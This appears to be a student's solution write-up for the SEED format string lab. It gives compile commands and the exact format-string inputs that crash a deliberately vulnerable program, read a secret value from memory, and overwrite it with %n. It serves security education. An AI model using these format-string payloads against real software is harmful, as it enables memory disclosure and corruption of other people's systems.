# SS

## Lab1

#### Documentation
* [Homepage](http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Format_String/)
* [Description](http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Format_String/Format_String.pdf)

#### Required
* [Ubuntu Virtual Machine](http://www.cis.syr.edu/~wedu/SEEDUbuntu12.04.zip)
* `vul_prog.c`
* `write_string.c`

#### Tasks
1. Crash the program
2. Print out the secret[1] value
3. Modify the secret[1] value

#### Solution
Compile and run `vul_prog.c`:
```
gcc vul_prog.c -o vul_prog
./vul_prog
```

1. Load memory address out from program reserved addresses
```
# input integer
255
# input string
%08x%08x%s
```

2. Go to secret[1] memory address and load value
```
# input integer
(secret[1] address hexa to decimal)
# input string
%08x%08x%08x%08x%08x%08x%08x%08x%s
```

3. Go to secret[1] memory address and save length with `printf(%n)`
```
# input integer
(secret[1] address hexa to decimal)
# input string
%08x%08x%08x%08x%08x%08x%08x%08x%n
```
